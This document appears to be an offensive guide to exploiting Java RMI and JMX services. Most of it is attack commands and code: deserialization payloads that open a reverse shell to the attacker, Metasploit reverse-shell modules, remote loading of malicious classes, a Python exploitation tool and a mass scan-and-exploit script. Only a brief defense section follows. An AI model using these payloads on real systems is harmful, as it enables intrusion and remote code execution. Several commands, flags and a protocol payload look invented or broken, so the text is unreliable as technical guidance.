# ‚òï Java RMI (Ports 1099, 1617, 8686) - Exploitation Guide

## üéØ Vulnerability Overview

**Service:** Java Remote Method Invocation (RMI)
**Common Ports:** 1099/tcp (default), 1617/tcp, 8686/tcp, and other high ports
**Vulnerability Types:** 
- Deserialization Attacks
- Unauthenticated Method Invocation
- Code Execution via RMI Registry/Lookup
- JRMP Client/Server Exploitation

**Severity:** Critical (Remote Code Execution)

### Description
Java RMI allows remote method invocation between Java Virtual Machines. Insecure configurations can lead to:
- Remote code execution via deserialization vulnerabilities
- Unauthorized access to sensitive methods
- Information disclosure through RMI registry enumeration
- Compromise of distributed Java applications

---

## üîç Reconnaissance Workflow

### Step 1: Service Detection

#### Port Scanning
```bash
# Standard RMI port scan
nmap -p 1099,1617,8686,1098,1100,11099 <target-ip>

# Comprehensive RMI port range
nmap -p 1090-11100,1600-1700,8600-8700 <target-ip>

# Version detection
nmap -sV -p 1099,1617,8686 <target-ip>

# RMI-specific NSE scripts
nmap -p 1099,1617,8686 --script rmi-* <target-ip>
```

#### RMI Service Identification
```bash
# Basic RMI connection test
echo "help" | nc <target-ip> 1099

# Using rmic (JDK tool)
rmic -list <target-ip>:1099

# RMI enumeration with Metasploit
msfconsole -x "use auxiliary/scanner/misc/java_rmi_server; set RHOSTS <target-ip>; run"
```

### Step 2: RMI Protocol Analysis

#### Manual RMI Enumeration
```bash
# List available RMI objects
java -cp . RMIList <target-ip> 1099

# Dump RMI registry contents
java -jar rmidump.jar <target-ip>:1099

# Check for vulnerable methods
java -cp . RMIMethodEnumerator <target-ip> 1099
```

#### RMI Registry Interaction
```bash
# Using jconsole (GUI)
jconsole <target-ip>:1099

# Programmatic registry listing
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
Registry registry = LocateRegistry.getRegistry("<target-ip>", 1099);
String[] names = registry.list();
```

### Step 3: Service Fingerprinting

#### RMI Version Detection
```bash
# Banner grabbing
nc -nv <target-ip> 1099
telnet <target-ip> 1099

# Protocol analysis
java -cp . RMIProtocolTester <target-ip>:1099

# Check for specific implementations
nmap -p 1099 --script rmi-dumpregistry <target-ip>
```

#### Common RMI Services
```bash
# WebLogic RMI
nmap -p 7001,7002 --script weblogic-* <target-ip>

# JBoss RMI
nmap -p 1099,4444,4445,4446 --script jboss-* <target-ip>

# JMX RMI (Java Management Extensions)
nmap -p 9010,9090,9091 --script jmx-* <target-ip>
```

---

## üí• Exploitation Workflow

### Method 1: Deserialization Attacks

#### ysoserial Exploitation
```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 "nc -e /bin/bash <your-ip> 4444" > payload.ser

# Send payload to RMI service
java -cp . RMIClient <target-ip> 1099 payload.ser

# Using curl for HTTP wrapped RMI
curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser http://<target-ip>:8080/rmi-endpoint
```

#### Common ysoserial Gadgets
```bash
# List available gadgets
java -jar ysoserial.jar

# Generate different payloads
java -jar ysoserial.jar CommonsCollections5 "command" > payload5.ser
java -jar ysoserial.jar Groovy1 "command" > payload_groovy.ser
java -jar ysoserial.jar Spring1 "command" > payload_spring.ser
java -jar ysoserial.jar Jdk7u21 "command" > payload_jdk.ser
```

### Method 2: Metasploit Exploitation

#### RMI Scanner Module
```bash
msfconsole -x "use auxiliary/scanner/misc/java_rmi_server; set RHOSTS <target-ip>; set RPORT 1099; run"
```

#### RMI Deserialization Attack
```bash
set rhosts 
set RHOST <target-ip>
set RPORT 1099
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 4444
exploit
```

#### JMX Invocation MBean Attack
```bash
use exploit/multi/misc/java_jmx_server
set RHOST <target-ip>
set RPORT 1617
set LHOST <your-ip>
exploit
```

### Method 3: Manual RMI Invocation

#### Direct Method Call
```java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIExploit {
    public static void main(String[] args) {
        try {
            Registry registry = LocateRegistry.getRegistry("<target-ip>", 1099);
            String[] names = registry.list();
            for (String name : names) {
                System.out.println("Found RMI object: " + name);
                // Attempt to invoke methods
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

#### Dangerous Method Invocation
```bash
# Using rmiscout
java -jar rmiscout.jar -i <target-ip> -p 1099 invoke <object> <method> <params>

# Manual invocation with reflection
java -cp . RMIMethodInvoker <target-ip>:1099 objectName methodName param1 param2
```

### Method 4: JRMP Exploitation

#### JRMP Listener Attack
```bash
# Start JRMP listener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "nc -e /bin/bash <your-ip> 4444"

# Trigger connection from target
java -cp . JRMPClient <target-ip> 1099

# Using Metasploit
use exploit/multi/misc/java_rmi_server
set RHOST <target-ip>
set PAYLOAD java/jsp_shell_reverse_tcp
exploit
```

#### JRMP Client Exploitation
```bash
# Exploit vulnerable JRMP client
java -cp ysoserial.jar ysoserial.exploit.JRMPClient <target-ip> 1099 CommonsCollections1 "command"

# With different gadget chains
java -cp ysoserial.jar ysoserial.exploit.JRMPClient <target-ip> 1099 Groovy1 "id; whoami"
```

### Method 5: JMX RMI Exploitation

#### JMX MBean Attack
```bash
# JMX enumeration
nmap -p 1617,8686 --script jmx-* <target-ip>

# JMX authentication bypass
java -cp . JMXInvoker <target-ip> 1617 "java.lang:type=Memory" gc

# Create MBean and execute code
java -jar jmxinvoke.jar -h <target-ip> -p 1617 -o create -c javax.management.loading.MLet -t java.lang.String
```

#### JMX Deserialization
```bash
# Send serialized payload to JMX
java -cp . JMXPayloadSender <target-ip> 1617 payload.ser

# Using curl for JMX over HTTP
curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser http://<target-ip>:1617/jmx-invoker
```

---

## üõ†Ô∏è Advanced Exploitation Techniques

### Method 6: RMI Registry Bypass

#### Registry Manipulation
```bash
# Bind malicious object to registry
java -cp . RMIBind <target-ip> 1099 evilObject evilClass

# Replace existing object
java -cp . RMIReplace <target-ip> 1099 existingObject maliciousPayload.ser

# Unbind legitimate objects
java -cp . RMIUnbind <target-ip> 1099 targetObject
```

#### Dynamic Class Loading Attack
```bash
# Host malicious class file
python3 -m http.server 8080

# Trigger dynamic loading
java -cp . RMIClassLoader <target-ip> 1099 http://<your-ip>:8080/evil.class

# Using codebase parameter
java -Djava.rmi.server.codebase=http://<your-ip>:8080/ -cp . RMIClient <target-ip> 1099
```

### Method 7: SSL/TLS Bypass

#### RMI over SSL Exploitation
```bash
# Bypass SSL verification
java -Djavax.net.ssl.trustStore= -Djavax.net.ssl.trustStoreType= -cp . RMISSLClient <target-ip> 1099

# MITM RMI SSL
java -Djavax.net.ssl.trustStore=malicious_keystore -cp . RMIClient <target-ip> 1099

# Strip SSL from RMI
tools/rmi-ssl-strip.py <target-ip> 1099
```

#### Certificate Manipulation
```bash
# Generate malicious certificate
keytool -genkey -alias evil -keystore evil_keystore

# Export certificate
keytool -export -alias evil -keystore evil_keystore -file evil.cer

# Inject into target truststore
java -Djavax.net.ssl.trustStore=evil_keystore -cp . RMIClient <target-ip> 1099
```

### Method 8: Application-Specific Exploits

#### WebLogic RMI Exploitation
```bash
# T3 protocol exploitation
java -jar weblogic-exploit.jar t3://<target-ip>:7001

# RMI over T3
java -cp . WebLogicRMI <target-ip> 7001

# Coherence RMI attack
java -jar coherence-exploit.jar <target-ip> 1099
```

#### JBoss RMI Attacks
```bash
# JBoss JMX invoker
java -jar jboss-exploit.jar <target-ip> 1099

# RMI over HTTP
curl -X POST -H "Content-Type: application/x-java-serialized-object" http://<target-ip>:8080/invoker/JMXInvokerServlet --data-binary @payload.ser
```

---

## üîß Custom Exploitation Tools

### Python RMI Exploitation Framework
```python
#!/usr/bin/env python3
"""
RMI Exploitation Framework
Advanced tool for RMI scanning, enumeration, and exploitation
"""

import socket
import struct
import sys
import threading
from concurrent.futures import ThreadPoolExecutor

class RMIExploiter:
    def __init__(self, timeout=10):
        self.timeout = timeout
        self.results = []
    
    def check_rmi_service(self, target, port=1099):
        """Check if RMI service is running"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((target, port))
            
            # Send RMI protocol header
            sock.send(b"\x4a\x52\x4d\x49\x00\x02\x4b")
            response = sock.recv(1024)
            
            if response and len(response) > 0:
                return True, "RMI service detected"
            return False, "No RMI response"
            
        except Exception as e:
            return False, f"Connection failed: {str(e)}"
        finally:
            try:
                sock.close()
            except:
                pass
    
    def enumerate_registry(self, target, port=1099):
        """Attempt to enumerate RMI registry"""
        try:
            # Java RMI registry list command
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((target, port))
            
            # RMI protocol message for list()
            payload = bytearray([
                0x4a, 0x52, 0x4d, 0x49, 0x00, 0x02, 0x4b, 0x00, 0x00, 0x00, 0x00, 
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            ])
            
            sock.send(payload)
            response = sock.recv(4096)
            
            if response and len(response) > 50:
                return True, f"Registry enumeration possible: {response.hex()}"
            return False, "Registry enumeration failed"
            
        except Exception as e:
            return False, f"Enumeration failed: {str(e)}"
        finally:
            try:
                sock.close()
            except:
                pass
    
    def send_ysoserial_payload(self, target, port, gadget, command):
        """Send ysoserial payload to RMI service"""
        try:
            # Generate payload using ysoserial (external call)
            import subprocess
            import tempfile
            
            with tempfile.NamedTemporaryFile(delete=False) as tmp:
                subprocess.run([
                    "java", "-jar", "ysoserial.jar", 
                    gadget, command
                ], stdout=tmp, check=True)
                tmp.flush()
                
                # Read payload and send
                with open(tmp.name, "rb") as f:
                    payload = f.read()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((target, port))
                sock.send(payload)
                
                response = sock.recv(1024)
                return True, "Payload sent successfully"
                
        except Exception as e:
            return False, f"Payload delivery failed: {str(e)}"
        finally:
            try:
                sock.close()
            except:
                pass

def main():
    parser = argparse.ArgumentParser(description="RMI Exploitation Framework")
    parser.add_argument("target", help="Target IP or file containing targets")
    parser.add_argument("-p", "--port", type=int, default=1099, help="RMI port")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Thread count")
    parser.add_argument("--check", action="store_true", help="Check RMI service")
    parser.add_argument("--enumerate", action="store_true", help="Enumerate registry")
    parser.add_argument("--exploit", action="store_true", help="Send ysoserial payload")
    parser.add_argument("--gadget", help="Ysoserial gadget to use")
    parser.add_argument("--command", help="Command to execute")
    
    args = parser.parse_args()
    exploiter = RMIExploiter()
    
    if args.check:
        result, message = exploiter.check_rmi_service(args.target, args.port)
        print(f"RMI Service: {result} - {message}")
    
    elif args.enumerate:
        result, message = exploiter.enumerate_registry(args.target, args.port)
        print(f"Registry Enumeration: {result} - {message}")
    
    elif args.exploit:
        if not args.gadget or not args.command:
            print("Error: --gadget and --command required for exploitation")
            return
        
        result, message = exploiter.send_ysoserial_payload(
            args.target, args.port, args.gadget, args.command
        )
        print(f"Exploitation: {result} - {message}")

if __name__ == "__main__":
    main()
```

### Mass RMI Scanner
```bash
#!/bin/bash
# RMI Mass Scanner and Exploiter

TARGETS="$1"
OUTPUT="rmi_scan_results.txt"
THREADS=20

scan_rmi() {
    target=$1
    port=$2
    
    echo "Scanning $target:$port"
    
    # Check if port is open
    timeout 2 nc -zv $target $port &>/dev/null
    if [ $? -eq 0 ]; then
        # Check for RMI service
        response=$(echo -e "\x4a\x52\x4d\x49\x00\x02\x4b" | timeout 5 nc $target $port | xxd -p)
        
        if [[ ! -z "$response" ]]; then
            echo "[+] RMI service found on $target:$port"
            echo "$target:$port" >> $OUTPUT
            
            # Additional checks
            check_vulnerabilities $target $port
        fi
    fi
}

check_vulnerabilities() {
    target=$1
    port=$2
    
    # Check for common RMI vulnerabilities
    java -jar rmi-scanner.jar $target $port >> vuln_scan.txt
    
    # Test for deserialization
    echo "Testing deserialization on $target:$port"
    java -jar ysoserial.jar CommonsCollections1 "echo test" | timeout 5 nc $target $port
    
    # Check for JMX exposure
    if [ $port -eq 1617 ] || [ $port -eq 8686 ]; then
        echo "Testing JMX on $target:$port"
        java -cp . JMXChecker $target $port
    fi
}

export -f scan_rmi check_vulnerabilities
echo "Starting RMI mass scan..."

# Read targets and scan
while read -r target; do
    for port in 1099 1617 8686 1098 1100 11099; do
        echo $target $port
    done
done < $TARGETS | xargs -P $THREADS -n 2 bash -c 'scan_rmi "$@"' _

echo "Scan completed. Results in $OUTPUT"
```

---

## ‚úÖ Post-Exploitation Activities

### Initial Assessment
```bash
# Java environment information
java -version
echo $JAVA_HOME
ls -la $JAVA_HOME

# Running Java processes
jps -l
ps aux | grep java

# JVM information
jinfo <pid>
jstat -gc <pid>
```

### RMI Service Analysis
```bash
# Current RMI registries
jstat -registry

# Active RMI connections
netstat -an | grep 1099
netstat -an | grep 1617
netstat -an | grep 8686

# RMI registry contents
rmiregistry -list
```

### Application Server Analysis
```bash
# WebLogic specific
find / -name "*.war" -o -name "*.ear" 2>/dev/null
ls -la /Oracle/Middleware/ 2>/dev/null

# JBoss specific
find / -name "jboss-*" -type d 2>/dev/null
ls -la /opt/jboss/ 2>/dev/null

# Tomcat RMI
find / -name "catalina.policy" 2>/dev/null
```

---

## üõ°Ô∏è Defense and Mitigation

### RMI Security Hardening
```bash
# Disable RMI registry
java -Djava.rmi.server.disableRegistry=true

# Use SSL for RMI
java -Djavax.rmi.ssl.server.enabled=true \
     -Djavax.rmi.ssl.client.enabled=true

# Restrict RMI ports
java -Dcom.sun.management.jmxremote.port=1617 \
     -Dcom.sun.management.jmxremote.ssl=true \
     -Dcom.sun.management.jmxremote.authenticate=true
```

### Network Protection
```bash
# Firewall rules
iptables -A INPUT -p tcp --dport 1099 -j DROP
iptables -A INPUT -p tcp --dport 1617 -j DROP
iptables -A INPUT -p tcp --dport 8686 -j DROP

# Allow only from specific networks
iptables -A INPUT -p tcp --dport 1099 -s 192.168.1.0/24 -j ACCEPT
```

### Java Security Manager
```bash
# Enable Security Manager
java -Djava.security.manager -Djava.security.policy=rmi.policy

# Sample RMI policy
grant {
    permission java.net.SocketPermission "*:1099", "connect";
    permission java.net.SocketPermission "*:1617", "connect";
    permission java.net.SocketPermission "*:8686", "connect";
};
```

---

## üìö References and Tools

### Essential Tools
- **ysoserial:** https://github.com/frohoff/ysoserial
- **rmiscout:** https://github.com/BishopFox/rmiscout
- **JMXInvoke:** https://github.com/mogwailabs/JMXInvoke
- **BaRMIe:** https://github.com/NickstaDB/BaRMIe

### Additional Resources
- **Java RMI Documentation:** https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/
- **JMX Security:** https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
- **Deserialization Cheat Sheet:** https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet

### Common Vulnerable Components
- Apache Commons Collections (3.x, 4.x)
- Spring Framework (specific versions)
- Groovy (CVE-2015-3253)
- JMX (multiple vulnerabilities)
- Various application servers (WebLogic, JBoss, WebSphere)
